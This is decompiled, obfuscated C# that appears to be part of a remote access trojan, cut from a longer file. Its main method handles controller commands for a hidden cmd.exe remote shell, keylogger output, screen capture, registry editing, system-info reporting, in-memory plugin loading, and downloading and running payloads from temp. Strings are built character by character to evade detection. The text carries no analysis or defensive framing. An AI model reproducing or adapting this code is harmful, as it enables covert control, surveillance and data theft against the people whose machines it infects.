			while (*(int*)((byte*)ptr + 12) < class21_1.int_1 && *(int*)((byte*)ptr + 8) == class21_1.byte_0[*(int*)((byte*)ptr + 12)])
			{
				(*(int*)((byte*)ptr + 12))++;
				if (++num >= *(int*)ptr)
				{
					break;
				}
			}
			if (num < *(int*)((byte*)ptr + 4))
			{
				short[] short_;
				short[] array2 = (short_ = class21_0.short_0);
				int num4 = *(int*)((byte*)ptr + 8);
				nint num3 = num4;
				array2[num4] = (short)(short_[num3] + (short)num);
			}
			else if (*(int*)((byte*)ptr + 8) != 0)
			{
				short[] short_;
				(short_ = class21_0.short_0)[16] = (short)(short_[16] + 1);
			}
			else if (num <= 10)
			{
				short[] short_;
				(short_ = class21_0.short_0)[17] = (short)(short_[17] + 1);
			}
			else
			{
				short[] short_;
				(short_ = class21_0.short_0)[18] = (short)(short_[18] + 1);
			}
		}
	}

	unsafe static void smethod_124(Class13.Class20.Class21 class21_0)
	{
		void* ptr = stackalloc byte[36];
		*(int*)ptr = class21_0.short_0.Length;
		int[] array = new int[*(int*)ptr];
		int num = 0;
		int num2 = 0;
		*(int*)((byte*)ptr + 4) = 0;
		while (*(int*)((byte*)ptr + 4) < *(int*)ptr)
		{
			*(int*)((byte*)ptr + 8) = class21_0.short_0[*(int*)((byte*)ptr + 4)];
			if (*(int*)((byte*)ptr + 8) != 0)
			{
				int num3 = num++;
				int num4;
				while (num3 > 0 && class21_0.short_0[array[num4 = (num3 - 1) / 2]] > *(int*)((byte*)ptr + 8))
				{
					array[num3] = array[num4];
					num3 = num4;
				}
				array[num3] = *(int*)((byte*)ptr + 4);
				num2 = *(int*)((byte*)ptr + 4);
			}
			(*(int*)((byte*)ptr + 4))++;
		}
		while (num < 2)
		{
			int num5 = ((num2 < 2) ? (++num2) : 0);
			array[num++] = num5;
		}
		class21_0.int_1 = Math.Max(num2 + 1, class21_0.int_0);
		*(int*)((byte*)ptr + 12) = num;
		int[] array2 = new int[4 * num - 2];
		int[] array3 = new int[2 * num - 1];
		int num6 = *(int*)((byte*)ptr + 12);
		*(int*)((byte*)ptr + 16) = 0;
		while (*(int*)((byte*)ptr + 16) < num)
		{
			*(int*)((byte*)ptr + 20) = array[*(int*)((byte*)ptr + 16)];
			array2[2 * *(int*)((byte*)ptr + 16)] = *(int*)((byte*)ptr + 20);
			array2[2 * *(int*)((byte*)ptr + 16) + 1] = -1;
			array3[*(int*)((byte*)ptr + 16)] = class21_0.short_0[*(int*)((byte*)ptr + 20)] << 8;
			array[*(int*)((byte*)ptr + 16)] = *(int*)((byte*)ptr + 16);
			(*(int*)((byte*)ptr + 16))++;
		}
		do
		{
			*(int*)((byte*)ptr + 24) = array[0];
			int num7 = array[--num];
			int num8 = 0;
			int num9;
			for (num9 = 1; num9 < num; num9 = num9 * 2 + 1)
			{
				if (num9 + 1 < num && array3[array[num9]] > array3[array[num9 + 1]])
				{
					num9++;
				}
				array[num8] = array[num9];
				num8 = num9;
			}
			int num10 = array3[num7];
			while ((num9 = num8) > 0 && array3[array[num8 = (num9 - 1) / 2]] > num10)
			{
				array[num9] = array[num8];
			}
			array[num9] = num7;
			*(int*)((byte*)ptr + 28) = array[0];
			num7 = num6++;
			array2[2 * num7] = *(int*)((byte*)ptr + 24);
			array2[2 * num7 + 1] = *(int*)((byte*)ptr + 28);
			*(int*)((byte*)ptr + 32) = Math.Min(array3[*(int*)((byte*)ptr + 24)] & 0xFF, array3[*(int*)((byte*)ptr + 28)] & 0xFF);
			num10 = (array3[num7] = array3[*(int*)((byte*)ptr + 24)] + array3[*(int*)((byte*)ptr + 28)] - *(int*)((byte*)ptr + 32) + 1);
			num8 = 0;
			for (num9 = 1; num9 < num; num9 = num8 * 2 + 1)
			{
				if (num9 + 1 < num && array3[array[num9]] > array3[array[num9 + 1]])
				{
					num9++;
				}
				array[num8] = array[num9];
				num8 = num9;
			}
			while ((num9 = num8) > 0 && array3[array[num8 = (num9 - 1) / 2]] > num10)
			{
				array[num9] = array[num8];
			}
			array[num9] = num7;
		}
		while (num > 1);
		Class24.smethod_44(class21_0, array2);
	}

	static int smethod_125(Class13.Class15 class15_0, int int_0)
	{
		if (class15_0.int_2 < int_0)
		{
			if (class15_0.int_0 == class15_0.int_1)
			{
				return -1;
			}
			class15_0.uint_0 |= (uint)(((class15_0.byte_0[class15_0.int_0++] & 0xFF) | ((class15_0.byte_0[class15_0.int_0++] & 0xFF) << 8)) << class15_0.int_2);
			class15_0.int_2 += 16;
		}
		return (int)(class15_0.uint_0 & ((1 << int_0) - 1));
	}

	static void smethod_126(Exception exception_0)
	{
		Class24.smethod_144(exception_0, new object[0]);
	}

	unsafe static void smethod_127(byte[] byte_0, Class0 class0_0)
	{
		//IL_0e93: Unknown result type (might be due to invalid IL or missing references)
		//IL_0e9a: Expected O, but got Unknown
		void* ptr = stackalloc byte[17];
		string[] array = Strings.Split(Class24.smethod_32(class0_0, ref byte_0), class0_0.string_8, -1, (CompareMethod)0);
		try
		{
			string text = array[0];
			if (Operators.CompareString(text, new string(new char[3] { 'r', 's', 's' }), false) == 0)
			{
				try
				{
					NewLateBinding.LateCall(class0_0.object_1, (Type)null, "Kill", new object[0], (string[])null, (Type[])null, (bool[])null, true);
				}
				catch (Exception ex)
				{
					ProjectData.SetProjectError(ex);
					Exception ex2 = ex;
					ProjectData.ClearProjectError();
				}
				class0_0.object_1 = new Process();
				NewLateBinding.LateSetComplex(NewLateBinding.LateGet(class0_0.object_1, (Type)null, "StartInfo", new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, "RedirectStandardOutput", new object[1] { true }, (string[])null, (Type[])null, false, true);
				NewLateBinding.LateSetComplex(NewLateBinding.LateGet(class0_0.object_1, (Type)null, "StartInfo", new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, "RedirectStandardInput", new object[1] { true }, (string[])null, (Type[])null, false, true);
				NewLateBinding.LateSetComplex(NewLateBinding.LateGet(class0_0.object_1, (Type)null, "StartInfo", new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, "RedirectStandardError", new object[1] { true }, (string[])null, (Type[])null, false, true);
				NewLateBinding.LateSetComplex(NewLateBinding.LateGet(class0_0.object_1, (Type)null, "StartInfo", new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, "FileName", new object[1] { new char[7] { 'c', 'm', 'd', '.', 'e', 'x', 'e' } }, (string[])null, (Type[])null, false, true);
				NewLateBinding.LateSetComplex(NewLateBinding.LateGet(class0_0.object_1, (Type)null, "StartInfo", new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, "RedirectStandardError", new object[1] { true }, (string[])null, (Type[])null, false, true);
				((Process)class0_0.object_1).OutputDataReceived += class0_0.method_0;
				((Process)class0_0.object_1).ErrorDataReceived += class0_0.method_0;
				((Process)class0_0.object_1).Exited += class0_0.method_3;
				NewLateBinding.LateSetComplex(NewLateBinding.LateGet(class0_0.object_1, (Type)null, "StartInfo", new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, "UseShellExecute", new object[1] { false }, (string[])null, (Type[])null, false, true);
				NewLateBinding.LateSetComplex(NewLateBinding.LateGet(class0_0.object_1, (Type)null, "StartInfo", new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, "CreateNoWindow", new object[1] { true }, (string[])null, (Type[])null, false, true);
				NewLateBinding.LateSetComplex(NewLateBinding.LateGet(class0_0.object_1, (Type)null, "StartInfo", new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, "WindowStyle", new object[1] { ProcessWindowStyle.Hidden }, (string[])null, (Type[])null, false, true);
				NewLateBinding.LateSet(class0_0.object_1, (Type)null, "EnableRaisingEvents", new object[1] { true }, (string[])null, (Type[])null);
				Class24.smethod_102(class0_0, new string(new char[3] { 'r', 's', 's' }));
				NewLateBinding.LateCall(class0_0.object_1, (Type)null, "Start", new object[0], (string[])null, (Type[])null, (bool[])null, true);
				NewLateBinding.LateCall(class0_0.object_1, (Type)null, "BeginErrorReadLine", new object[0], (string[])null, (Type[])null, (bool[])null, true);
				NewLateBinding.LateCall(class0_0.object_1, (Type)null, "BeginOutputReadLine", new object[0], (string[])null, (Type[])null, (bool[])null, true);
			}
			else if (Operators.CompareString(text, new string(new char[2] { 'r', 's' }), false) == 0)
			{
				NewLateBinding.LateCall(NewLateBinding.LateGet(class0_0.object_1, (Type)null, "StandardInput", new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, "WriteLine", new object[1] { Class24.smethod_173(class0_0, ref array[1]) }, (string[])null, (Type[])null, (bool[])null, true);
			}
			else if (Operators.CompareString(text, new string(new char[3] { 'r', 's', 'c' }), false) == 0)
			{
				try
				{
					NewLateBinding.LateCall(class0_0.object_1, (Type)null, "Kill", new object[0], (string[])null, (Type[])null, (bool[])null, true);
				}
				catch (Exception ex3)
				{
					ProjectData.SetProjectError(ex3);
					Exception ex4 = ex3;
					ProjectData.ClearProjectError();
				}
				class0_0.object_1 = null;
			}
			else if (Operators.CompareString(text, new string(new char[2] { 'k', 'l' }), false) == 0)
			{
				Class24.smethod_102(class0_0, new string(new char[2] { 'k', 'l' }) + class0_0.string_8 + Class24.smethod_134(class0_0, ref class0_0.class1_0.string_1));
			}
			else if (Operators.CompareString(text, new string(new char[3] { 'i', 'n', 'f' }), false) == 0)
			{
				string text2 = new string(new char[3] { 'i', 'n', 'f' }) + class0_0.string_8;
				if (Operators.CompareString(Class24.smethod_162(class0_0, "vn"), "", false) == 0)
				{
					string text3 = text2;
					string string_ = Class24.smethod_173(class0_0, ref class0_0.string_0) + new string(new char[1] { '_' }) + Class24.smethod_156(class0_0);
					text2 = text3 + Class24.smethod_134(class0_0, ref string_) + class0_0.string_8;
				}
				else
				{
					string text4 = text2;
					string string_ = Class24.smethod_162(class0_0, "vn");
					string string_2 = Class24.smethod_173(class0_0, ref string_) + "_" + Class24.smethod_156(class0_0);
					text2 = text4 + Class24.smethod_134(class0_0, ref string_2) + class0_0.string_8;
				}
				text2 = text2 + class0_0.string_6 + new string(new char[1] { ':' }) + class0_0.string_7 + class0_0.string_8;
				text2 = text2 + class0_0.string_4 + class0_0.string_8;
				text2 = text2 + class0_0.string_3 + class0_0.string_8;
				text2 += Process.GetCurrentProcess().ProcessName;
				Class24.smethod_102(class0_0, text2);
			}
			else if (Operators.CompareString(text, new string(new char[4] { 'p', 'r', 'o', 'f' }), false) == 0)
			{
				string text5 = array[1];
				if (Operators.CompareString(text5, new string(new char[1] { '~' }), false) == 0)
				{
					Class24.smethod_160(class0_0, array[2], array[3]);
				}
				else if (Operators.CompareString(text5, new string(new char[1] { '!' }), false) == 0)
				{
					Class24.smethod_160(class0_0, array[2], array[3]);
					Class24.smethod_102(class0_0, new string(new char[8] { 'g', 'e', 't', 'v', 'a', 'l', 'u', 'e' }) + class0_0.string_8 + array[1] + class0_0.string_8 + Class24.smethod_162(class0_0, array[1]));
				}
				else if (Operators.CompareString(text5, new string(new char[1] { '~' }), false) == 0)
				{
					Class24.smethod_115(array[2], class0_0);
				}
			}
			else if (Operators.CompareString(text, new string(new char[2] { 'r', 'n' }), false) == 0)
			{
				byte[] array2 = null;
				if (!array[2].ToLower().StartsWith(new string(new char[4] { 'h', 't', 't', 'p' })))
				{
					byte[] byte_ = Convert.FromBase64String(array[2]);
					((byte*)ptr)[16] = 0;
					array2 = Class24.smethod_159(class0_0, byte_, ref *(bool*)((byte*)ptr + 16));
				}
				else
				{
					object obj = new WebClient();
					object[] array3 = new object[1];
					object[] array4 = array3;
					*(int*)((byte*)ptr + 4) = 2;
					array4[0] = array[*(int*)((byte*)ptr + 4)];
					object[] array5 = array3;
					object[] array6 = array5;
					bool[] array7 = new bool[1] { true };
					object obj2 = NewLateBinding.LateGet(obj, (Type)null, "DownloadData", array6, (string[])null, (Type[])null, array7);
					if (array7[0])
					{
						array[*(int*)((byte*)ptr + 4)] = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array5[0]), typeof(string));
					}
					array2 = (byte[])obj2;
				}
				Class24.smethod_102(class0_0, new string(new char[3] { 'b', 'l', 'a' }));
				string text6 = Interaction.Environ("temp") + "\\" + Class24.smethod_92(10, class0_0) + "." + array[1];
				File.WriteAllBytes(text6, array2);
				Process.Start(text6);
			}
			else if (Operators.CompareString(text, new string(new char[3] { 'i', 'n', 'v' }), false) == 0)
			{
				Class24.smethod_102(class0_0, new string(new char[3] { 'b', 'l', 'a' }));
				string text7 = Class24.smethod_162(class0_0, array[1]);
				byte[] array8;
				if (text7.Length > 0)
				{
					array8 = Convert.FromBase64String(text7);
					Class24.smethod_102(class0_0, new string(new char[2] { 'p', 'l' }) + class0_0.string_8 + array[1] + class0_0.string_8 + Conversions.ToString(0));
				}
				else
				{
					if (array[3].Length == 1)
					{
						Class24.smethod_102(class0_0, "pl" + class0_0.string_8 + array[1] + class0_0.string_8 + "False");
						return;
					}
					byte[] byte_2 = Convert.FromBase64String(array[3]);
					((byte*)ptr)[16] = 0;
					array8 = Class24.smethod_159(class0_0, byte_2, ref *(bool*)((byte*)ptr + 16));
					if (Conversions.ToBoolean(Class24.smethod_160(class0_0, array[1], Convert.ToBase64String(array8))))
					{
						Class24.smethod_102(class0_0, new string(new char[2] { 'p', 'l' }) + class0_0.string_8 + array[1] + class0_0.string_8 + Conversions.ToString(0));
					}
				}
				object objectValue = RuntimeHelpers.GetObjectValue(Class24.smethod_135(class0_0, array8, new string(new char[1] { 'A' })));
				NewLateBinding.LateSet(objectValue, (Type)null, "h", new object[1] { class0_0.string_6 }, (string[])null, (Type[])null);
				NewLateBinding.LateSet(objectValue, (Type)null, "p", new object[1] { class0_0.string_7 }, (string[])null, (Type[])null);
				NewLateBinding.LateSet(objectValue, (Type)null, "osk", new object[1] { array[2] }, (string[])null, (Type[])null);
				NewLateBinding.LateCall(objectValue, (Type)null, "start", new object[0], (string[])null, (Type[])null, (bool[])null, true);
				while (!Conversions.ToBoolean(Operators.OrObject((object)(!class0_0.bool_2), Operators.CompareObjectEqual(NewLateBinding.LateGet(objectValue, (Type)null, "Off", new object[0], (string[])null, (Type[])null, (bool[])null), (object)true, false))))
				{
					Thread.Sleep(1);
				}
				NewLateBinding.LateSet(objectValue, (Type)null, "off", new object[1] { true }, (string[])null, (Type[])null);
			}
			else if (Operators.CompareString(text, new string(new char[3] { 'r', 'e', 't' }), false) == 0)
			{
				Class24.smethod_102(class0_0, new string(new char[3] { 'b', 'l', 'a' }));
				string text8 = Class24.smethod_162(class0_0, array[1]);
				byte[] array9;
				if (text8.Length > 0)
				{
					array9 = Convert.FromBase64String(text8);
					Class24.smethod_102(class0_0, new string(new char[2] { 'p', 'l' }) + class0_0.string_8 + array[1] + class0_0.string_8 + Conversions.ToString(0));
				}
				else
				{
					if (array[2].Length == 1)
					{
						Class24.smethod_102(class0_0, "pl" + class0_0.string_8 + array[1] + class0_0.string_8 + "True");
						return;
					}
					byte[] byte_3 = Convert.FromBase64String(array[2]);
					((byte*)ptr)[16] = 0;
					array9 = Class24.smethod_159(class0_0, byte_3, ref *(bool*)((byte*)ptr + 16));
					if (Conversions.ToBoolean(Class24.smethod_160(class0_0, array[1], Convert.ToBase64String(array9))))
					{
						Class24.smethod_102(class0_0, new string(new char[2] { 'p', 'l' }) + class0_0.string_8 + array[1] + class0_0.string_8 + Conversions.ToString(0));
					}
				}
				object objectValue2 = RuntimeHelpers.GetObjectValue(Class24.smethod_135(class0_0, array9, new string(new char[1] { 'A' })));
				string[] array10 = new string[5]
				{
					new string(new char[3] { 'r', 'e', 't' }),
					class0_0.string_8,
					array[1],
					class0_0.string_8,
					null
				};
				string[] array11 = array10;
				string string_2 = Conversions.ToString(NewLateBinding.LateGet(objectValue2, (Type)null, "GT", new object[0], (string[])null, (Type[])null, (bool[])null));
				array11[4] = Class24.smethod_134(class0_0, ref string_2);
				Class24.smethod_102(class0_0, string.Concat(array10));
			}
			else if (Operators.CompareString(text, new string(new char[3] { 'C', 'A', 'P' }), false) == 0)
			{
				int width = Screen.get_PrimaryScreen().get_Bounds().Width;
				Rectangle rectangle = Screen.get_PrimaryScreen().get_Bounds();
				Bitmap val = new Bitmap(width, rectangle.Height);
				Graphics val2 = Graphics.FromImage((Image)(object)val);
				Size size = new Size(((Image)val).get_Width(), ((Image)val).get_Height());
				val2.CopyFromScreen(0, 0, 0, 0, size, (CopyPixelOperation)13369376);
				try
				{
					Cursor @default = Cursors.get_Default();
					Point position = Cursor.get_Position();
					size = new Size(32, 32);
					rectangle = new Rectangle(position, size);
					@default.Draw(val2, rectangle);
				}
				catch (Exception ex5)
				{
					ProjectData.SetProjectError(ex5);
					Exception ex6 = ex5;
					ProjectData.ClearProjectError();
				}
				val2.Dispose();
				MemoryStream memoryStream = new MemoryStream();
				string string_2 = new string(new char[3] { 'C', 'A', 'P' }) + class0_0.string_8;
				byte_0 = Class24.smethod_198(ref string_2, class0_0);
				memoryStream.Write(byte_0, 0, byte_0.Length);
				MemoryStream memoryStream2 = new MemoryStream();
				IntPtr intPtr = default(IntPtr);
				((Image)val).GetThumbnailImage(Conversions.ToInteger(array[1]), Conversions.ToInteger(array[2]), (GetThumbnailImageAbort)null, intPtr).Save((Stream)memoryStream2, ImageFormat.get_Jpeg());
				memoryStream.Write(memoryStream2.ToArray(), 0, checked((int)memoryStream2.Length));
				Class24.smethod_180(class0_0, memoryStream.ToArray());
				memoryStream.Dispose();
				memoryStream2.Dispose();
				((Image)val).Dispose();
			}
			else if (Operators.CompareString(text, new string(new char[1] { 'P' }), false) == 0)
			{
				Class24.smethod_102(class0_0, new string(new char[1] { 'P' }));
			}
			else if (Operators.CompareString(text, new string(new char[2] { 'u', 'n' }), false) == 0)
			{
				string text9 = array[1];
				if (Operators.CompareString(text9, new string(new char[1] { '~' }), false) == 0)
				{
					Class24.smethod_97(class0_0);
				}
				else if (Operators.CompareString(text9, new string(new char[1] { '!' }), false) == 0)
				{
					Class24.smethod_15(class0_0, 0);
					ProjectData.EndApp();
				}
				else if (Operators.CompareString(text9, new string(new char[1] { '@' }), false) == 0)
				{
					Class24.smethod_15(class0_0, 0);
					Type typeFromHandle = typeof(Process);
					object[] array5 = new object[1];
					object[] array12 = array5;
					object object_ = class0_0.object_0;
					array12[0] = RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(object_, (Type)null, "FullName", new object[0], (string[])null, (Type[])null, (bool[])null));
					object[] array3 = array5;
					object[] array13 = array3;
					bool[] array7 = new bool[1] { true };
					NewLateBinding.LateCall((object)null, typeFromHandle, "Start", array13, (string[])null, (Type[])null, array7, true);
					if (array7[0])
					{
						NewLateBinding.LateSetComplex(object_, (Type)null, "FullName", new object[1] { RuntimeHelpers.GetObjectValue(array3[0]) }, (string[])null, (Type[])null, true, false);
					}
					ProjectData.EndApp();
				}
			}
			else if (Operators.CompareString(text, new string(new char[2] { 'u', 'p' }), false) == 0)
			{
				byte[] array14 = null;
				if (!array[1].ToLower().StartsWith(new string(new char[4] { 'h', 't', 't', 'p' })))
				{
					byte[] byte_4 = Convert.FromBase64String(array[1]);
					((byte*)ptr)[16] = 0;
					array14 = Class24.smethod_159(class0_0, byte_4, ref *(bool*)((byte*)ptr + 16));
				}
				else
				{
					object obj3 = new WebClient();
					object[] array15 = new object[1];
					object[] array16 = array15;
					*(int*)((byte*)ptr + 4) = 1;
					array16[0] = array[*(int*)((byte*)ptr + 4)];
					object[] array5 = array15;
					object[] array17 = array5;
					bool[] array7 = new bool[1] { true };
					object obj4 = NewLateBinding.LateGet(obj3, (Type)null, "DownloadData", array17, (string[])null, (Type[])null, array7);
					if (array7[0])
					{
						array[*(int*)((byte*)ptr + 4)] = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array5[0]), typeof(string));
					}
					array14 = (byte[])obj4;
				}
				Class24.smethod_102(class0_0, new string(new char[3] { 'b', 'l', 'a' }));
				NewLateBinding.LateCall(NewLateBinding.LateGet(NewLateBinding.LateGet(class0_0.object_3, (Type)null, "Registry", new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, "CurrentUser", new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, "SetValue", new object[2] { "di", "" }, (string[])null, (Type[])null, (bool[])null, true);
				string text10 = Interaction.Environ("temp") + "\\" + Class24.smethod_92(10, class0_0) + ".exe";
				File.WriteAllBytes(text10, array14);
				Process.Start(text10, new string(new char[3] { 'U', 'P', ':' }) + Conversions.ToString(Process.GetCurrentProcess().Id));
				*(int*)ptr = 0;
				do
				{
					Thread.Sleep(10);
					if (Operators.ConditionalCompareObjectEqual(NewLateBinding.LateGet(NewLateBinding.LateGet(NewLateBinding.LateGet(class0_0.object_3, (Type)null, "Registry", new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, "CurrentUser", new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, "GetValue", new object[2] { "di", "" }, (string[])null, (Type[])null, (bool[])null), (object)"!", false))
					{
						Class24.smethod_97(class0_0);
					}
					checked
					{
						(*unchecked((int*)ptr))++;
					}
				}
				while (*(int*)ptr <= 500);
			}
			else
			{
				if (Operators.CompareString(text, new string(new char[2] { 'R', 'G' }), false) != 0)
				{
					return;
				}
				object obj5 = Class24.smethod_3(class0_0, array[2]);
				string text11 = array[1];
				if (Operators.CompareString(text11, new string(new char[1] { '~' }), false) == 0)
				{
					string text12 = "RG" + class0_0.string_8 + "~" + class0_0.string_8 + array[2] + class0_0.string_8;
					string text13 = "";
					IEnumerator enumerator = default(IEnumerator);
					try
					{
						enumerator = ((IEnumerable)NewLateBinding.LateGet(obj5, (Type)null, "GetSubKeyNames", new object[0], (string[])null, (Type[])null, (bool[])null)).GetEnumerator();
						while (enumerator.MoveNext())
						{
							string text14 = Conversions.ToString(enumerator.Current);
							if (!text14.Contains(new string(new char[1] { '\\' })))
							{
								text13 = text13 + text14 + class0_0.string_8;
							}
						}
					}
					finally
					{
						if (enumerator is IDisposable)
						{
							(enumerator as IDisposable).Dispose();
						}
					}
					IEnumerator enumerator2 = default(IEnumerator);
					try
					{
						enumerator2 = ((IEnumerable)NewLateBinding.LateGet(obj5, (Type)null, "GetValueNames", new object[0], (string[])null, (Type[])null, (bool[])null)).GetEnumerator();
						while (enumerator2.MoveNext())
						{
							string text15 = Conversions.ToString(enumerator2.Current);
							string[] array10 = new string[7] { text13, text15, "/", null, null, null, null };
							string[] array18 = array10;
							object[] array19 = new object[1] { text15 };
							object[] array20 = array19;
							bool[] array21 = new bool[1] { true };
							object obj6 = NewLateBinding.LateGet(obj5, (Type)null, "GetValueKind", array20, (string[])null, (Type[])null, array21);
							if (array21[0])
							{
								text15 = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array19[0]), typeof(string));
							}
							array18[3] = obj6.ToString();
							array10[4] = "/";
							string[] array22 = array10;
							object[] array5 = new object[2] { text15, "" };
							object[] array23 = array5;
							bool[] array7 = new bool[2] { true, false };
							object obj7 = NewLateBinding.LateGet(obj5, (Type)null, "GetValue", array23, (string[])null, (Type[])null, array7);
							if (array7[0])
							{
								text15 = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array5[0]), typeof(string));
							}
							array22[5] = obj7.ToString();
							array10[6] = class0_0.string_8;
							text13 = string.Concat(array10);
						}
					}
					finally
					{
						if (enumerator2 is IDisposable)
						{
							(enumerator2 as IDisposable).Dispose();
						}
					}
					Class24.smethod_102(class0_0, text12 + text13);
				}
				else if (Operators.CompareString(text11, new string(new char[1] { '!' }), false) == 0)
				{
					object[] array19 = new object[3];
					object[] array24 = array19;
					*(int*)((byte*)ptr + 4) = 3;
					array24[0] = array[*(int*)((byte*)ptr + 4)];
					object[] array25 = array19;
					*(int*)((byte*)ptr + 8) = 4;
					array25[1] = array[*(int*)((byte*)ptr + 8)];
					object[] array26 = array19;
					*(int*)((byte*)ptr + 12) = 5;
					array26[2] = array[*(int*)((byte*)ptr + 12)];
					object[] array15 = array19;
					object[] array27 = array15;
					bool[] array21 = new bool[3] { true, true, true };
					NewLateBinding.LateCall(obj5, (Type)null, "SetValue", array27, (string[])null, (Type[])null, array21, true);
					if (array21[0])
					{
						array[*(int*)((byte*)ptr + 4)] = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array15[0]), typeof(string));
					}
					if (array21[1])
					{
						array[*(int*)((byte*)ptr + 8)] = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array15[1]), typeof(string));
					}
					if (array21[2])
					{
						array[*(int*)((byte*)ptr + 12)] = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array15[2]), typeof(string));
					}
				}
				else if (Operators.CompareString(text11, new string(new char[1] { '@' }), false) == 0)
				{
					object[] array19 = new object[2];
					object[] array28 = array19;
					*(int*)((byte*)ptr + 12) = 3;
					array28[0] = array[*(int*)((byte*)ptr + 12)];
					array19[1] = false;
					object[] array15 = array19;
					object[] array29 = array15;
					bool[] array21 = new bool[2] { true, false };
					NewLateBinding.LateCall(obj5, (Type)null, "DeleteValue", array29, (string[])null, (Type[])null, array21, true);
					if (array21[0])
					{
						array[*(int*)((byte*)ptr + 12)] = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array15[0]), typeof(string));
					}
				}
				else if (Operators.CompareString(text11, new string(new char[1] { '#' }), false) == 0)
				{
					object[] array19 = new object[1];
					object[] array30 = array19;
					*(int*)((byte*)ptr + 12) = 3;
					array30[0] = array[*(int*)((byte*)ptr + 12)];
					object[] array15 = array19;
					object[] array31 = array15;
					bool[] array21 = new bool[1] { true };
					NewLateBinding.LateCall(obj5, (Type)null, "CreateSubKey", array31, (string[])null, (Type[])null, array21, true);
					if (array21[0])
					{
						array[*(int*)((byte*)ptr + 12)] = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array15[0]), typeof(string));
					}
				}
				else if (Operators.CompareString(text11, new string(new char[1] { '$' }), false) == 0)
				{
					object[] array19 = new object[1];
					object[] array32 = array19;
					*(int*)((byte*)ptr + 12) = 3;
					array32[0] = array[*(int*)((byte*)ptr + 12)];
					object[] array15 = array19;
					object[] array33 = array15;
					bool[] array21 = new bool[1] { true };
					NewLateBinding.LateCall(obj5, (Type)null, "DeleteSubKeyTree", array33, (string[])null, (Type[])null, array21, true);
					if (array21[0])
					{
						array[*(int*)((byte*)ptr + 12)] = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array15[0]), typeof(string));
					}
				}
			}
		}
		catch (Exception ex7)
		{
			ProjectData.SetProjectError(ex7);
			Exception ex8 = ex7;
			try
			{
				Class24.smethod_102(class0_0, new string(new char[2] { 'E', 'R' }) + class0_0.string_8 + array[0] + class0_0.string_8 + ex8.Message);
				if ((Operators.CompareString(array[0], "up", false) == 0) | (Operators.CompareString(array[0], "rn", false) == 0))
				{
					Class24.smethod_102(class0_0, new string(new char[3] { 'b', 'l', 'a' }));
				}
			}
			catch (Exception ex9)
			{
				ProjectData.SetProjectError(ex9);
				Exception ex10 = ex9;
				ProjectData.ClearProjectError();
			}
			ProjectData.ClearProjectError();
		}
	}

	static string smethod_128()
	{
		return "SmartAssembly";
	}

	static SecurityException smethod_129(EventArgs2 eventArgs2_0)
	{
		return eventArgs2_0.securityException_0;
	}

	unsafe static int smethod_130(int int_0, int int_1, Class13.Class14 class14_0, byte[] byte_0)
	{
		void* ptr = stackalloc byte[12];
		*(int*)ptr = 0;
		while (true)
		{
			if (class14_0.int_4 != 11)
			{
				*(int*)((byte*)ptr + 4) = Class24.smethod_152(int_0, byte_0, class14_0.class16_0, int_1);
				int_1 += *(int*)((byte*)ptr + 4);
				*(int*)ptr += *(int*)((byte*)ptr + 4);
				int_0 -= *(int*)((byte*)ptr + 4);
				if (int_0 == 0)
				{
					*(int*)((byte*)ptr + 8) = *(int*)ptr;
					break;
				}
			}
			if (!Class24.smethod_18(class14_0) && (Class24.smethod_9(class14_0.class16_0) <= 0 || class14_0.int_4 == 11))
			{
				*(int*)((byte*)ptr + 8) = *(int*)ptr;
				break;
			}
		}
		return *(int*)((byte*)ptr + 8);
	}

	[DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	static extern int GetVolumeInformationA([MarshalAs(UnmanagedType.VBByRefStr)] ref string string_0, [MarshalAs(UnmanagedType.VBByRefStr)] ref string string_1, int int_0, ref int int_1, ref int int_2, ref int int_3, [MarshalAs(UnmanagedType.VBByRefStr)] ref string string_2, int int_4);

	static void smethod_131(EventHandler eventHandler_0, Class36 class36_0)
	{
		EventHandler eventHandler = class36_0.eventHandler_0;
		EventHandler eventHandler2;
		do
		{
			eventHandler2 = eventHandler;
			EventHandler value = (EventHandler)Delegate.Combine(eventHandler2, eventHandler_0);
			eventHandler = Interlocked.CompareExchange(ref class36_0.eventHandler_0, value, eventHandler2);
		}
		while ((object)eventHandler != eventHandler2);
	}

	static bool smethod_132(string string_0, EventArgs1 eventArgs1_0)
	{
		if (File.Exists(string_0))
		{
			File.Delete(string_0);
		}
		return Class24.smethod_40(eventArgs1_0.class28_0, string_0);
	}

	static bool smethod_133(Class13.Class19 class19_0)
	{
		return Class24.smethod_96(class19_0.class22_0);
	}

	static string smethod_134(Class0 class0_0, ref string string_0)
	{
		byte[] bytes = Encoding.UTF8.GetBytes(string_0);
		return Convert.ToBase64String(bytes);
	}

	static object smethod_135(Class0 class0_0, byte[] byte_0, string string_0)
	{
		object obj = Assembly.Load(byte_0);
		try
		{
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception ex2 = ex;
			ProjectData.ClearProjectError();
		}
